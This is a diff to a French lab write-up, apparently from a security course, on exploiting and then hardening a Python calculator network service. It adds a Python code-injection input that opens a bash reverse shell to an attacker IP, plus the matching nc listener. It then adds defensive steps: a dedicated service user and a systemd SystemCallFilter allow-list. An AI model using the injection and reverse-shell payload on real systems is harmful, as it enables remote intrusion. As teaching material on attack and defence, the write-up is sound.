@@ -80,10 +80,10 @@ Hello4+4
 ```bash
 nc 192.168.1.195 13337
 
-Hello__import__(\"os\").system(\"bash -i >& /dev/tcp/<IP_ATTACKER>/9999 0>&1\")
+Hello__import__("os").system("bash -i >& /dev/tcp/192.168.1.150/9999 0>&1")
 ```
 
-- Listener sur la machine attaquante :
+- Listener sur la machine attaquante (`192.168.1.150`) :
 
 ```bash
 nc -lvp 9999
@@ -105,6 +105,8 @@ sudo chattr +i /opt/calc.py
 ```
 
 🌞 **Modifier le service pour l'exécuter sous cet utilisateur :**
+
+Modifier `/etc/systemd/system/calculatrice.service` :
 
 ```ini
 [Service]
@@ -143,7 +145,7 @@ Modifier le service pour ajouter `SystemCallFilter=` :
 ```ini
 [Service]
 ...
-SystemCallFilter=<liste des syscalls légitimes identifiés>
+SystemCallFilter=accept4 access arch_prctl bind brk capget chdir close connect dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl keyctl listen lseek mmap mprotect munmap newfstatat openat prctl pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto setresuid setreuid set_robust_list setsockopt set_tid_address signaldeliver socket switch sysinfo write pread64
 ...
 ```
 
